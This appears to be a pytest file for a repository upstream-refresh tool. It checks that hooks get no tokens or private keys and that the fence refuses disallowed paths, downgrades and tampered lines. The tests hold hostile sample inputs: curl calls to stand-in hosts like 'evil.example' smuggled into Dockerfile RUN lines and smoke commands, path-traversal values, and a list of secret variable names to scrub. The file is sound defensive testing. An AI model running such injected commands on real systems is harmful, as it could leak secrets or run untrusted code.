"""Tests for vergil_tooling.lib.upstream_refresh (epic vergil-project/.github#1168, Task 3a).

Git runs for real: ``prepare`` clones a temp bare ``origin`` standing in for
GitHub, and the fence tests build their diffs in a real repo, so the changed
lines are exactly what ``git diff -U0`` gives.
"""

from __future__ import annotations

import json
import subprocess
from typing import TYPE_CHECKING

import pytest

from vergil_tooling.lib import develop_clone, github
from vergil_tooling.lib.config import ConfigError, PathRule, UpstreamRefreshConfig
from vergil_tooling.lib.upstream_refresh import (
    KEY_ENV,
    META_FILE,
    PATCH_FILE,
    REPORT_ENV,
    Prepared,
    UpstreamRefreshError,
    diff_changed_lines,
    fence_violations,
    glob_match,
    hook_env,
    prepare,
    read_prepared,
    render_body,
    run_hook,
)

if TYPE_CHECKING:
    from pathlib import Path

_REPO = "o/r"

_BASE_TOML = """\
[project]
repository-type = "library"
versioning-scheme = "semver"
branching-model = "library-release"
release-model = "tagged-release"
primary-language = "python"

[dependencies]
vergil = "v2.0"

[ci]
versions = ["3.14"]
"""


def _git(cwd: Path, *args: str) -> str:
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, capture_output=True, text=True
    ).stdout.strip()


@pytest.fixture(autouse=True)
def _hermetic(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    for var in ("AUTHOR", "COMMITTER"):
        monkeypatch.setenv(f"GIT_{var}_NAME", "Test")
        monkeypatch.setenv(f"GIT_{var}_EMAIL", "test@example.com")
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(tmp_path / "gitconfig"))
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    monkeypatch.delenv(KEY_ENV, raising=False)
    monkeypatch.setattr(github, "repo_installation_token", lambda _repo: None)
    monkeypatch.setattr(github, "get_installation_token", lambda *_a, **_k: None)


def _origin(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, hook: str) -> tuple[Path, Path]:
    """A bare origin whose ``develop`` has a vergil.toml with *hook*; returns (origin, seed)."""
    origin = tmp_path / "origin.git"
    _git(tmp_path, "init", "-q", "--bare", "-b", "develop", str(origin))
    seed = tmp_path / "seed"
    _git(tmp_path, "clone", "-q", str(origin), str(seed))
    _git(seed, "checkout", "-q", "-b", "develop")
    toml = _BASE_TOML + f"\n[upstream-refresh]\nhook = {json.dumps(hook)}\n"
    (seed / "vergil.toml").write_text(toml)
    (seed / "data.txt").write_text("old\n")
    (seed / "blob.bin").write_bytes(b"\x00\x01old")
    (seed / ".gitignore").write_text("ignored/\n")
    _git(seed, "add", ".")
    _git(seed, "commit", "-qm", "base")
    _git(seed, "push", "-q", "origin", "develop")
    monkeypatch.setattr(develop_clone, "clone_url", lambda _repo: origin.as_uri())
    return origin, seed


# -- prepare -------------------------------------------------------------------


def test_prepare_writes_patch_and_meta(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    hook = (
        'echo new > data.txt; printf "\\000\\002new" > blob.bin; '
        'echo "bumped data" > "$VRG_UPSTREAM_REPORT"'
    )
    origin, seed = _origin(tmp_path, monkeypatch, hook)
    base_sha = _git(seed, "rev-parse", "HEAD")
    out = tmp_path / "out"
    prepared = prepare(_REPO, out)
    assert prepared == Prepared(
        repo=_REPO, base_sha=base_sha, paths=["blob.bin", "data.txt"], notes=["bumped data"]
    )
    meta = json.loads((out / META_FILE).read_text())
    assert meta == {
        "repo": _REPO,
        "base_sha": base_sha,
        "paths": ["blob.bin", "data.txt"],
        "notes": ["bumped data"],
    }
    # The patch applies on the recorded base in a separate clone.
    check = tmp_path / "check"
    _git(tmp_path, "clone", "-q", str(origin), str(check))
    _git(check, "checkout", "-q", "--detach", base_sha)
    _git(check, "apply", "--index", str(out / PATCH_FILE))
    assert (check / "data.txt").read_text() == "new\n"
    assert (check / "blob.bin").read_bytes() == b"\x00\x02new"
    # The caller's checkout is never touched.
    assert (seed / "data.txt").read_text() == "old\n"


def test_prepare_no_change_writes_empty_paths(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _origin(tmp_path, monkeypatch, "mkdir -p ignored && echo x > ignored/build.log")
    out = tmp_path / "out"
    prepared = prepare(_REPO, out)
    assert prepared.paths == []
    assert json.loads((out / META_FILE).read_text())["paths"] == []
    assert not (out / PATCH_FILE).exists()


def test_prepare_refuses_untracked_files(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _origin(tmp_path, monkeypatch, "echo new > data.txt; echo stray > stray.txt")
    out = tmp_path / "out"
    with pytest.raises(UpstreamRefreshError, match=r"hook left untracked files: stray\.txt"):
        prepare(_REPO, out)
    assert not (out / META_FILE).exists()
    assert not (out / PATCH_FILE).exists()


def test_prepare_records_base_before_the_hook_moves_head(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _origin(tmp_path, monkeypatch, "echo new > data.txt && git commit -qam hook-commit")
    base_sha = _git(tmp_path / "seed", "rev-parse", "HEAD")
    prepared = prepare(_REPO, tmp_path / "out")
    assert prepared.base_sha == base_sha
    assert prepared.paths == ["data.txt"]


def test_prepare_refuses_when_key_present(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _origin(tmp_path, monkeypatch, "echo new > data.txt")
    monkeypatch.setenv(KEY_ENV, "-----BEGIN PRIVATE KEY-----")

    def no_clone(*_a: object, **_k: object) -> object:
        pytest.fail("prepare must refuse before cloning")

    monkeypatch.setattr(develop_clone, "clone_develop", no_clone)
    with pytest.raises(UpstreamRefreshError, match=rf"\${KEY_ENV} is set") as info:
        prepare(_REPO, tmp_path / "out")
    assert "BEGIN PRIVATE KEY" not in str(info.value)


def test_prepare_refuses_used_out_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _origin(tmp_path, monkeypatch, "echo new > data.txt")
    out = tmp_path / "out"
    out.mkdir()
    (out / META_FILE).write_text("{}")
    with pytest.raises(UpstreamRefreshError, match=r"already holds meta\.json"):
        prepare(_REPO, out)


def test_prepare_passes_token_to_clone_only(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _origin(tmp_path, monkeypatch, 'env > "$VRG_UPSTREAM_REPORT"')
    seen: list[str | None] = []
    real = develop_clone.clone_develop

    def spy(repo: str, *, token: str | None = None) -> object:
        seen.append(token)
        return real(repo)

    monkeypatch.setattr(develop_clone, "clone_develop", spy)
    prepared = prepare(_REPO, tmp_path / "out", token="t0ken-value")
    assert seen == ["t0ken-value"]
    assert not any("t0ken-value" in note for note in prepared.notes)


def test_prepare_requires_upstream_refresh_section(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _, seed = _origin(tmp_path, monkeypatch, "true")
    (seed / "vergil.toml").write_text(_BASE_TOML)
    _git(seed, "commit", "-qam", "drop section")
    _git(seed, "push", "-q", "origin", "develop")
    with pytest.raises(UpstreamRefreshError, match=r"has no \[upstream-refresh\] section"):
        prepare(_REPO, tmp_path / "out")


def test_prepare_invalid_config_raises(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _, seed = _origin(tmp_path, monkeypatch, "true")
    (seed / "vergil.toml").write_text(_BASE_TOML + '\n[upstream-refresh]\nhook = "h"\npaths = 3\n')
    _git(seed, "commit", "-qam", "bad paths")
    _git(seed, "push", "-q", "origin", "develop")
    with pytest.raises(ConfigError, match=r"paths must be an array"):
        prepare(_REPO, tmp_path / "out")


def test_hook_read_from_clone_config(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """The hook comes from develop's vergil.toml, never from the caller's checkout."""
    _origin(tmp_path, monkeypatch, 'echo from-develop > "$VRG_UPSTREAM_REPORT"')
    caller = tmp_path / "caller"
    caller.mkdir()
    toml = _BASE_TOML + '\n[upstream-refresh]\nhook = "echo from-caller > data.txt"\n'
    (caller / "vergil.toml").write_text(toml)
    monkeypatch.chdir(caller)
    prepared = prepare(_REPO, tmp_path / "out")
    assert prepared.notes == ["from-develop"]
    assert prepared.paths == []
    assert "Running [upstream-refresh].hook in " in capsys.readouterr().out


# -- the hook ------------------------------------------------------------------

_SCRUBBED = (
    "GH_TOKEN",
    "GITHUB_TOKEN",
    "GH_ENTERPRISE_TOKEN",
    "VRG_AUTOMATION_PRIVATE_KEY",
    "VRG_AUTOMATION_CLIENT_ID",
    "VRG_AUTOMATION_APP",
    "VRG_APP_ID",
    "VRG_PRIVATE_KEY_PATH",
    "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
    "GIT_CONFIG_COUNT",
    "GIT_CONFIG_KEY_0",
    "GIT_CONFIG_VALUE_0",
    "GIT_CONFIG_PARAMETERS",
)


def test_hook_env_has_no_tokens_or_key(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    for name in _SCRUBBED:
        monkeypatch.setenv(name, f"secret-{name}")
    monkeypatch.setenv("KEEP_ME", "visible")
    report = tmp_path / "report.txt"
    notes = run_hook(tmp_path, 'env > "$VRG_UPSTREAM_REPORT"', report)
    names = {note.split("=", 1)[0] for note in notes}
    assert not names & set(_SCRUBBED)
    assert not any("secret-" in note for note in notes)
    assert "KEEP_ME=visible" in notes
    assert f"{REPORT_ENV}={report}" in notes


def test_hook_env_function_scrubs_the_same(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    for name in _SCRUBBED:
        monkeypatch.setenv(name, "x")
    env = hook_env(tmp_path / "r")
    assert not set(env) & set(_SCRUBBED)
    assert env[REPORT_ENV] == str(tmp_path / "r")


def test_prepare_hook_sees_no_token(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _origin(tmp_path, monkeypatch, 'env > "$VRG_UPSTREAM_REPORT"')
    monkeypatch.setenv("GH_TOKEN", "ghs_secret")
    monkeypatch.setenv("VRG_AUTOMATION_CLIENT_ID", "Iv1.secret")
    prepared = prepare(_REPO, tmp_path / "out")
    assert not any("secret" in note for note in prepared.notes)


def test_hook_failure_raises(tmp_path: Path) -> None:
    with pytest.raises(UpstreamRefreshError, match=r"hook failed \(exit 3\): exit 3"):
        run_hook(tmp_path, "exit 3", tmp_path / "report.txt")


def test_hook_without_report_has_no_notes(tmp_path: Path) -> None:
    assert run_hook(tmp_path, "true", tmp_path / "report.txt") == []


def test_hook_runs_from_tree(tmp_path: Path) -> None:
    notes = run_hook(tmp_path, 'pwd > "$VRG_UPSTREAM_REPORT"', tmp_path / "report.txt")
    assert notes == [str(tmp_path)]


# -- read_prepared -------------------------------------------------------------

_SHA = "a" * 40


def _write_prepared(path: Path, meta: object, patch: bytes | None = b"diff\n") -> Path:
    path.mkdir(parents=True, exist_ok=True)
    (path / META_FILE).write_text(json.dumps(meta))
    if patch is not None:
        (path / PATCH_FILE).write_bytes(patch)
    return path


def _meta(**overrides: object) -> dict[str, object]:
    meta: dict[str, object] = {"repo": _REPO, "base_sha": _SHA, "paths": ["a.txt"], "notes": []}
    meta.update(overrides)
    return meta


def test_read_prepared_round_trip(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _origin(tmp_path, monkeypatch, "echo new > data.txt")
    out = tmp_path / "out"
    prepared = prepare(_REPO, out)
    again, patch = read_prepared(out)
    assert again == prepared
    assert patch == (out / PATCH_FILE).read_bytes()


def test_read_prepared_empty_has_no_patch(tmp_path: Path) -> None:
    out = _write_prepared(tmp_path / "out", _meta(paths=[]), patch=None)
    prepared, patch = read_prepared(out)
    assert prepared.paths == []
    assert patch is None


@pytest.mark.parametrize(
    ("meta", "match"),
    [
        ({"repo": _REPO, "base_sha": _SHA, "paths": ["a"]}, r"missing: \['notes'\]"),
        (_meta(extra=1), r"unexpected: \['extra'\]"),
        (_meta(base_sha="not-a-sha"), "base_sha must be a full lower-case hex SHA"),
        (_meta(base_sha="A" * 40), "base_sha must be a full lower-case hex SHA"),
        (_meta(base_sha="a" * 39), "base_sha must be a full lower-case hex SHA"),
        (_meta(paths=["docker/../.github/workflows/ci.yml"]), r"has an empty, \. or \.\. segment"),
        (_meta(paths=["../x"]), r"has an empty, \. or \.\. segment"),
        (_meta(paths=["/etc/passwd"]), "is absolute"),
        (_meta(paths=[""]), "is empty"),
        (_meta(paths=["a", "a"]), "duplicates"),
        (_meta(paths="a"), "paths must be a list of strings"),
        (_meta(paths=[1]), "paths must be a list of strings"),
        (_meta(repo="no-slash"), "repo must be OWNER/NAME"),
        (_meta(notes=[3]), "notes must be a list of strings"),
        (_meta(notes=["x\n## injected"]), "a note contains a line break"),
        ([], "must be a JSON object"),
    ],
)
def test_read_prepared_rejects_bad_meta(tmp_path: Path, meta: object, match: str) -> None:
    out = _write_prepared(tmp_path / "out", meta)
    with pytest.raises(UpstreamRefreshError, match=match):
        read_prepared(out)


def test_read_prepared_rejects_patch_mismatch(tmp_path: Path) -> None:
    out = _write_prepared(tmp_path / "a", _meta(), patch=None)
    with pytest.raises(UpstreamRefreshError, match="is missing"):
        read_prepared(out)
    out = _write_prepared(tmp_path / "b", _meta(paths=[]))
    with pytest.raises(UpstreamRefreshError, match="lists no changed paths but"):
        read_prepared(out)


def test_read_prepared_rejects_missing_or_bad_json(tmp_path: Path) -> None:
    with pytest.raises(UpstreamRefreshError, match="not found; run prepare first"):
        read_prepared(tmp_path)
    (tmp_path / META_FILE).write_text("{not json")
    with pytest.raises(UpstreamRefreshError, match="is not readable JSON"):
        read_prepared(tmp_path)


# -- PR body -------------------------------------------------------------------


def test_body_says_the_job_merges_and_lists_notes() -> None:
    body = render_body(["bumped x"], ["a.txt"])
    assert body.startswith("Automated upstream refresh. The upstream-refresh job merges this PR")
    assert "once CI passes" in body
    assert "human" not in body
    assert "## Changed files\n\n- `a.txt`" in body
    assert "## Notes\n\n- bumped x" in body


def test_body_omits_notes_when_none() -> None:
    assert "## Notes" not in render_body([], ["a.txt"])


# -- globs ---------------------------------------------------------------------


@pytest.mark.parametrize(
    ("path", "glob", "expected"),
    [
        ("docker/common/x.dockerfile", "docker/common/*", True),
        ("docker/common/sub/x.dockerfile", "docker/common/*", False),
        ("docker/common/sub/x", "docker/**", True),
        ("docker", "docker/**", True),
        (".github/workflows/ci.yml", "**", True),
        ("runtime.toml", "runtime.toml", True),
        ("runtime.toml.bak", "runtime.toml", False),
        ("a/b/c.json", "a/**/c.json", True),
        ("a/c.json", "a/**/c.json", True),
        ("A/c.json", "a/*", False),
    ],
)
def test_glob_match(path: str, glob: str, expected: bool) -> None:  # noqa: FBT001
    assert glob_match(path, glob) is expected


# -- the fence: a real repo builds the diff --------------------------------------

_FRAGMENT_RULE = (
    r"^ARG [A-Z0-9_]+_(VERSION=(?P<version>\d+(\.\d+)*)|SHA256_(AMD64|ARM64)=[0-9a-f]{64})$"
)
_FRAGMENT = PathRule(glob="docker/common/*", lines=_FRAGMENT_RULE)
_RUNTIME_RULE = (
    r"^(\[\[series\]\]|\[series\.sha256\]|series = \"\d+\.\d+\""
    r"|cpython = \"(?P<version>\d+\.\d+\.\d+)\"|pbs_tag = \"(?P<version_pbs>\d{8})\""
    r"|x86_64 = \"[0-9a-f]{64}\"|aarch64 = \"[0-9a-f]{64}\"|)$"
)
_RUNTIME = PathRule(glob="runtime.toml", lines=_RUNTIME_RULE)
_H1, _H2 = "1" * 64, "2" * 64


def _rules(*rules: PathRule | str) -> UpstreamRefreshConfig:
    return UpstreamRefreshConfig(
        hook="h", paths=tuple(PathRule(glob=r) if isinstance(r, str) else r for r in rules)
    )


def _fence(
    tmp_path: Path,
    rules: UpstreamRefreshConfig,
    before: dict[str, str | bytes],
    after: dict[str, str | bytes | None],
) -> list[str]:
    """Commit *before*, apply *after* (None deletes), and run the fence on the result."""
    tree = tmp_path / "fence"
    tree.mkdir(parents=True)
    _git(tree, "init", "-q", "-b", "develop")
    for name, content in before.items():
        _write(tree, name, content)
    _git(tree, "add", "-A")
    _git(tree, "commit", "-qm", "base", "--allow-empty")
    base = _git(tree, "rev-parse", "HEAD")
    for name, content in after.items():
        if content is None:
            (tree / name).unlink()
        else:
            _write(tree, name, content)
    _git(tree, "add", "-A")
    paths = _git(tree, "diff", "--name-only", "--no-renames", base).splitlines()
    before_toml = before.get("vergil.toml")
    after_toml = (tree / "vergil.toml").read_text() if (tree / "vergil.toml").exists() else None
    return fence_violations(
        rules,
        paths,
        diff_changed_lines(tree, base, paths),
        before_toml if isinstance(before_toml, str) else None,
        after_toml,
    )


def _write(tree: Path, name: str, content: str | bytes) -> None:
    target = tree / name
    target.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(content, bytes):
        target.write_bytes(content)
    else:
        target.write_text(content)


def test_fence_allows_listed_globs(tmp_path: Path) -> None:
    rules = _rules("docker/pins/toolchains.yml", "docker/versions/*.json")
    before = {"docker/pins/toolchains.yml": "a: 1\n", "docker/versions/matrix.json": "{}\n"}
    after: dict[str, str | bytes | None] = {
        "docker/pins/toolchains.yml": "a: 2\n",
        "docker/versions/matrix.json": '{"x": 1}\n',
    }
    assert _fence(tmp_path, rules, dict(before), after) == []


def test_fence_refuses_path_outside_allowlist(tmp_path: Path) -> None:
    rules = _rules("docker/pins/toolchains.yml")
    violations = _fence(
        tmp_path,
        rules,
        {"docker/pins/toolchains.yml": "a\n", "docker/pins/upstream-refresh.sh": "echo\n"},
        {"docker/pins/upstream-refresh.sh": "curl evil\n"},
    )
    assert violations == [
        "docker/pins/upstream-refresh.sh: refused, not covered by any "
        "[upstream-refresh].paths entry"
    ]


def test_fence_refuses_github_dir_even_with_star_star(tmp_path: Path) -> None:
    violations = _fence(
        tmp_path,
        _rules("**"),
        {".github/workflows/ci.yml": "on: push\n", "data.txt": "a\n"},
        {".github/workflows/ci.yml": "on: pull_request_target\n", "data.txt": "b\n"},
    )
    assert len(violations) == 1
    assert violations[0].startswith(".github/workflows/ci.yml: refused, .github/** is never")
    assert "whatever [upstream-refresh].paths allows" in violations[0]


def test_fence_refuses_github_dir_case_insensitively() -> None:
    lines = ["diff --git a/x b/x", "@@ -1 +1 @@", "-a", "+b"]
    violations = fence_violations(
        _rules("**"), [".GitHub/x.yml"], {".GitHub/x.yml": lines}, None, None
    )
    assert len(violations) == 1
    assert ".github/** is never changed" in violations[0]


def test_fence_no_paths_refuses_everything(tmp_path: Path) -> None:
    violations = _fence(tmp_path, _rules(), {"a.txt": "a\n"}, {"a.txt": "b\n"})
    assert violations == [
        "a.txt: refused, [upstream-refresh].paths is empty or absent, so every path is refused"
    ]


def test_fence_empty_change_has_no_violations() -> None:
    assert fence_violations(_rules(), [], {}, None, None) == []


def test_fence_refuses_path_with_no_diff_lines() -> None:
    assert fence_violations(_rules("a.txt"), ["a.txt"], {}, None, None) == [
        "a.txt: refused, it has no diff against the base commit"
    ]


def test_fence_refuses_unsafe_path() -> None:
    violations = fence_violations(_rules("**"), ["a/../b"], {"a/../b": ["@@"]}, None, None)
    assert violations == ["'a/../b': refused, the path has an empty, . or .. segment"]


def test_fence_refuses_symlink(tmp_path: Path) -> None:
    tree = tmp_path / "t"
    tree.mkdir()
    _git(tree, "init", "-q")
    (tree / "data.txt").write_text("a\n")
    _git(tree, "add", "-A")
    _git(tree, "commit", "-qm", "base")
    base = _git(tree, "rev-parse", "HEAD")
    (tree / "data.txt").unlink()
    (tree / "data.txt").symlink_to(".github/workflows/ci.yml")
    _git(tree, "add", "-A")
    violations = fence_violations(
        _rules("data.txt"), ["data.txt"], diff_changed_lines(tree, base, ["data.txt"]), None, None
    )
    assert violations == ["data.txt: refused, a symlink or submodule is never refresh output"]


# -- the fence: line rules ---------------------------------------------------------

_DOCKERFILE = (
    "ARG FOO_VERSION=1.2.3\n"
    "ARG CARGO_NEXTEST_VERSION=0.9.80\n"
    f"ARG CARGO_NEXTEST_SHA256_AMD64={_H1}\n"
    f"ARG CARGO_NEXTEST_SHA256_ARM64={_H1}\n"
    "ARG TRIVY_VERSION=0.60.0\n"
    "RUN curl -fsSL https://example.com/x | tar -x\n"
)
_FRAG = "docker/common/x.dockerfile"


def _frag_fence(
    tmp_path: Path, after: str, rules: UpstreamRefreshConfig | None = None
) -> list[str]:
    return _fence(tmp_path, rules or _rules(_FRAGMENT), {_FRAG: _DOCKERFILE}, {_FRAG: after})


def test_fence_line_rule_allows_version_lines(tmp_path: Path) -> None:
    after = _DOCKERFILE.replace("ARG FOO_VERSION=1.2.3", "ARG FOO_VERSION=1.3.0")
    assert _frag_fence(tmp_path, after) == []


def test_fence_line_rule_allows_paired_version_and_digest(tmp_path: Path) -> None:
    after = _DOCKERFILE.replace("NEXTEST_VERSION=0.9.80", "NEXTEST_VERSION=0.9.81").replace(
        _H1, _H2
    )
    assert _frag_fence(tmp_path, after) == []


@pytest.mark.parametrize("digest", ["2" * 63, "A" * 64, "g" * 64])
def test_fence_line_rule_refuses_malformed_digest(tmp_path: Path, digest: str) -> None:
    after = _DOCKERFILE.replace(f"SHA256_AMD64={_H1}", f"SHA256_AMD64={digest}")
    violations = _frag_fence(tmp_path, after)
    assert len(violations) == 1
    assert f"line +'ARG CARGO_NEXTEST_SHA256_AMD64={digest}' does not match" in violations[0]


@pytest.mark.parametrize("value", ["1.2.3/../x", "1.2.3 # x", "1.2.3\r"])
def test_fence_line_rule_refuses_value_outside_format(tmp_path: Path, value: str) -> None:
    after = _DOCKERFILE.replace("ARG FOO_VERSION=1.2.3", f"ARG FOO_VERSION={value}")
    violations = _frag_fence(tmp_path, after)
    assert len(violations) == 1
    assert violations[0].startswith(
        f"{_FRAG}: refused by the line rule of paths entry 'docker/common/*': line +"
    )


def test_fence_line_rule_refuses_trailing_space(tmp_path: Path) -> None:
    after = _DOCKERFILE.replace("ARG TRIVY_VERSION=0.60.0\n", "ARG TRIVY_VERSION=0.61.0 \n")
    violations = _frag_fence(tmp_path, after)
    assert len(violations) == 1
    assert "'ARG TRIVY_VERSION=0.61.0 '" in violations[0]


def test_fence_line_rule_refuses_run_line_change(tmp_path: Path) -> None:
    after = _DOCKERFILE.replace("example.com/x", "evil.example/x")
    violations = _frag_fence(tmp_path, after)
    assert len(violations) == 2
    assert all(
        v.startswith(f"{_FRAG}: refused by the line rule of paths entry 'docker/common/*'")
        for v in violations
    )
    assert any("line -'RUN curl" in v for v in violations)
    assert any("line +'RUN curl -fsSL https://evil.example" in v for v in violations)


def test_fence_line_rule_refuses_added_file(tmp_path: Path) -> None:
    violations = _fence(
        tmp_path,
        _rules(_FRAGMENT),
        {_FRAG: _DOCKERFILE},
        {"docker/common/new": "ARG X_VERSION=1\n"},
    )
    assert violations == [
        "docker/common/new: refused by the line rule of paths entry 'docker/common/*': "
        "an added file is not allowed under a line rule"
    ]


def test_fence_line_rule_refuses_deleted_and_binary_files(tmp_path: Path) -> None:
    violations = _fence(
        tmp_path,
        _rules(_FRAGMENT),
        {_FRAG: _DOCKERFILE, "docker/common/b": b"\x00\x01"},
        {_FRAG: None, "docker/common/b": b"\x00\x02"},
    )
    assert len(violations) == 2
    assert "docker/common/b: refused by the line rule" in violations[0]
    assert "a binary file is not allowed" in violations[0]
    assert "a deleted file is not allowed" in violations[1]


def test_fence_first_matching_rule_decides(tmp_path: Path) -> None:
    # A plain rule listed first wins over a later line rule for the same file.
    after = _DOCKERFILE.replace("example.com", "mirror.example")
    assert _frag_fence(tmp_path, after, _rules(_FRAG, _FRAGMENT)) == []


def test_fence_version_downgrade_refused(tmp_path: Path) -> None:
    after = _DOCKERFILE.replace("ARG TRIVY_VERSION=0.60.0", "ARG TRIVY_VERSION=0.59.1")
    assert _frag_fence(tmp_path, after) == [
        f"{_FRAG}: refused, 'ARG TRIVY_VERSION=' lowers its version from 0.60.0 to 0.59.1 "
        "(a refresh never lowers a pinned version)"
    ]


@pytest.mark.parametrize(
    ("old", "new"), [("0.60.0", "0.60.0"), ("0.60.0", "0.61.0"), ("1.9", "1.10")]
)
def test_fence_version_equal_or_higher_allowed(tmp_path: Path, old: str, new: str) -> None:
    before = _DOCKERFILE.replace("TRIVY_VERSION=0.60.0", f"TRIVY_VERSION={old}")
    after = before.replace(f"TRIVY_VERSION={old}", f"TRIVY_VERSION={new}") + "ARG Z_VERSION=1\n"
    assert _fence(tmp_path, _rules(_FRAGMENT), {_FRAG: before}, {_FRAG: after}) == []


_RUNTIME_TOML = f"""\
[[series]]
series = "3.14"
cpython = "3.14.10"
pbs_tag = "20261026"

[series.sha256]
x86_64 = "{_H1}"
aarch64 = "{_H1}"
"""


def _runtime_fence(tmp_path: Path, after: str) -> list[str]:
    return _fence(
        tmp_path, _rules(_RUNTIME), {"runtime.toml": _RUNTIME_TOML}, {"runtime.toml": after}
    )


def test_fence_runtime_toml_line_rule_refuses_traversal_pbs_tag(tmp_path: Path) -> None:
    bad = _RUNTIME_TOML.replace('pbs_tag = "20261026"', 'pbs_tag = "20261026/../x"')
    violations = _runtime_fence(tmp_path / "bad", bad)
    assert len(violations) == 1
    assert "line +'pbs_tag = \"20261026/../x\"' does not match" in violations[0]
    good = (
        _RUNTIME_TOML.replace('cpython = "3.14.10"', 'cpython = "3.14.11"')
        .replace('pbs_tag = "20261026"', 'pbs_tag = "20261102"')
        .replace(_H1, _H2)
    )
    assert _runtime_fence(tmp_path / "good", good) == []


def test_fence_version_downgrade_refused_in_runtime_toml(tmp_path: Path) -> None:
    lower_cpython = _RUNTIME_TOML.replace('cpython = "3.14.10"', 'cpython = "3.14.9"')
    assert _runtime_fence(tmp_path / "c", lower_cpython) == [
        "runtime.toml: refused, 'cpython = \"' lowers its version from 3.14.10 to 3.14.9 "
        "(a refresh never lowers a pinned version)"
    ]
    lower_tag = _RUNTIME_TOML.replace('pbs_tag = "20261026"', 'pbs_tag = "20261001"')
    assert _runtime_fence(tmp_path / "t", lower_tag) == [
        "runtime.toml: refused, 'pbs_tag = \"' lowers its version from 20261026 to 20261001 "
        "(a refresh never lowers a pinned version)"
    ]


def test_fence_new_series_block_allowed(tmp_path: Path) -> None:
    new_block = _RUNTIME_TOML.replace("3.14.10", "3.15.0").replace('"3.14"', '"3.15"')
    after = _RUNTIME_TOML + "\n" + new_block
    assert _runtime_fence(tmp_path, after) == []


def test_fence_non_numeric_version_refused() -> None:
    rule = PathRule(glob="f", lines=r"^V=(?P<version>[0-9a-z.]+)$")
    lines = ["diff --git a/f b/f", "@@ -1 +1 @@", "-V=1.2", "+V=1.2a"]
    violations = fence_violations(_rules(rule), ["f"], {"f": lines}, None, None)
    assert violations == [
        "f: refused, 'V=' has a version that is not numeric ('1.2' to '1.2a'), so the "
        "no-downgrade rule cannot compare it"
    ]


# -- the fence: vergil.toml ----------------------------------------------------------

_PY_TOML = """\
[project]
repository-type = "application"

[dependencies]
vergil = "v2.1"

[upstream-refresh]
hook = "packaging/upstream-refresh.sh"
paths = ["vergil.toml", "runtime.toml"]

[[package]]
builder = "staged"
noarch = false
name = "vergil-python3.14"
upstream-version = "3.14.10+20261026"
summary = "CPython 3.14 runtime"
smoke = "python3.14 -c 'import sys'"

[package.staged]
build-command = "packaging/build.sh 3.14"
paths = ["opt/python3.14"]
"""

_PY_315 = """
[[package]]
builder = "staged"
noarch = false
name = "vergil-python3.15"
upstream-version = "3.15.0+20261102"
summary = "CPython 3.15 runtime, new"
smoke = "python3.15 -c 'import sys'"

[package.staged]
build-command = "packaging/build.sh 3.15"
paths = ["opt/python3.15"]
"""


def _toml_fence(tmp_path: Path, after: str, before: str = _PY_TOML) -> list[str]:
    return _fence(tmp_path, _rules("vergil.toml"), {"vergil.toml": before}, {"vergil.toml": after})


def test_fence_vergil_toml_version_and_summary_allowed(tmp_path: Path) -> None:
    after = _PY_TOML.replace("3.14.10+20261026", "3.14.11+20261102").replace(
        "CPython 3.14 runtime", "CPython 3.14.11 runtime"
    )
    assert _toml_fence(tmp_path, after) == []


@pytest.mark.parametrize(
    "value", ["3.14.10+../x", "3.14.10", "3.14.11+2026110", "v3.14.11+20261102"]
)
def test_fence_vergil_toml_bad_upstream_version_refused(tmp_path: Path, value: str) -> None:
    violations = _toml_fence(tmp_path, _PY_TOML.replace("3.14.10+20261026", value))
    assert violations == [
        f"vergil.toml: refused, [[package]] 'vergil-python3.14': upstream-version {value!r} "
        r"does not match (?P<cpython>\d+\.\d+\.\d+)\+(?P<pbs>\d{8})"
    ]


@pytest.mark.parametrize("value", ["3.14.9+20261102", "3.14.10+20261001"])
def test_fence_vergil_toml_upstream_version_downgrade_refused(tmp_path: Path, value: str) -> None:
    violations = _toml_fence(tmp_path, _PY_TOML.replace("3.14.10+20261026", value))
    assert violations == [
        "vergil.toml: refused, [[package]] 'vergil-python3.14': upstream-version lowers its "
        f"version from 3.14.10+20261026 to {value} (a refresh never lowers a pinned version)"
    ]


def test_fence_vergil_toml_smoke_change_refused(tmp_path: Path) -> None:
    violations = _toml_fence(tmp_path, _PY_TOML.replace("import sys'", "import sys'; curl x"))
    assert violations == [
        "vergil.toml: refused, [[package]] 'vergil-python3.14': smoke changed; only "
        "upstream-version and summary may change"
    ]


def test_fence_vergil_toml_build_command_change_refused(tmp_path: Path) -> None:
    violations = _toml_fence(tmp_path, _PY_TOML.replace("build.sh 3.14", "build.sh 3.14 && x"))
    assert violations == [
        "vergil.toml: refused, [[package]] 'vergil-python3.14': staged changed; only "
        "upstream-version and summary may change"
    ]


def test_fence_vergil_toml_series_copy_allowed(tmp_path: Path) -> None:
    assert _toml_fence(tmp_path, _PY_TOML + _PY_315) == []


def test_fence_vergil_toml_new_entry_extra_command_refused(tmp_path: Path) -> None:
    after = _PY_TOML + _PY_315.replace("import sys'", "import sys'; curl https://evil.example")
    assert _toml_fence(tmp_path, after) == [
        "vergil.toml: refused, new [[package]] 'vergil-python3.15': smoke is not "
        "'vergil-python3.14''s with 3.14 replaced by 3.15 (a new entry must be a series copy)"
    ]


def test_fence_vergil_toml_new_entry_changed_build_command_refused(tmp_path: Path) -> None:
